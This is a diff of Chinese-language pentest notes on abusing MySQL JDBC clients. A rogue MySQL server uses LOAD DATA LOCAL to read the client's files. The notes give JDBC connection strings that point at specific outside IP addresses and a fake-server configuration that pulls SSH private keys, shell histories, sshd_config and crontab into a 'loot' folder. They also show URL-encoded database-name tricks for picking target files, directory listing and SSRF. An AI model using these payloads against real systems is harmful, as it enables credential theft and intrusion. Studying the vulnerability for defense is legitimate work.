@@ -1,17 +1,18 @@
 
 
 ## [**MySQL** 服务端恶意读取客户端任意文件漏洞]
-
+原理在于MySQL服务端可以利用 `LOAD DATA LOCAL` 命令来读取MYSQL客户端的任意文件。
 <https://cloud.tencent.com/developer/article/1818089>
 
 如果java的mysql的jdbc连接信息可以自定义，可以修改mysql的ip和连接配置如：
 ```
 test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
-jdbc:mysql://47.109.58.205:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
+jdbc:mysql://1.92.88.247:3306/test?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#
 root
 password
 
 代码：
+注册驱动 com.mysql.jdbc.Driver
 DriverManager.getConnection();
 ```
 可以使用下方的项目伪造一个mysql服务，从而读取客户端的文件。
@@ -27,7 +28,15 @@ version_string: "10.4.13-MariaDB-log"
 file_list: ["/root/.bash_history","C:/boot.ini","/var/log/mysqld.log","/etc/os-release","/root/.mysql_history","/etc/issue","/root/.ssh/id_rsa","/var/log","/etc/ssh/sshd_config","/etc/crontab","/root/.ssh/authorized_keys","/root/.ssh/id_rsa.pub"]
 save_path: ./loot
 always_read: true
+
 from_database_name: false
+# 如果为 true, 将会从客户端设定中的数据库名称中提取要读取的文件.
+# 例如链接串为 `jdbc:mysql://localhost:3306/%2fetc%2fhosts?allowLoadLocalInfile=true`.
+# 将会从客户端读取 `/etc/hosts` 而不会遵循 `file_list` 中的设置.
+# yakit标签 {{urlenc()}}
+
+
+
 max_file_size: 0
 
 auth: false
@@ -48,8 +57,8 @@ ysoserial_command:
 
 ^
 ## **列目录和SSRF**
-另外如果需要读文件, mysql-connector-java 支持使用 `file://` 列目录 (当然其他协议, 例如 http 来 SSRF 也是可以的), 但是需要在 `allowLoadLocalInfile` 为 true 之外, 额外指定 `allowUrlInLocalInfile` 为 true, 详情见[这里](https://github.com/mysql/mysql-connector-j/blob/dd61577595edad45c398af508cf91ad26fc4144f/src/main/protocol-impl/java/com/mysql/cj/protocol/a/NativeProtocol.java#L1877)\
-E.g.
+另外如果需要读文件, mysql-connector-java 支持使用 `file://` 列目录 (当然其他协议, 例如 http 来 SSRF 也是可以的), 但是需要在 `allowLoadLocalInfile` 为 true 之外, 额外指定 `allowUrlInLocalInfile` 为 true。但是默认没有开启的。
+<https://blog.csdn.net/fnmsd/article/details/117436182>
 
 * 列 `/` 目录, `jdbc:mysql://127.0.0.1:3306/file%3A%2F%2F%2F?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
 * SSRF `http://127.0.0.1:25565`, `jdbc:mysql://127.0.0.1:3306/http%3A%2F%2F127.0.0.1:25565?allowLoadLocalInfile=true&allowUrlInLocalInfile=true`
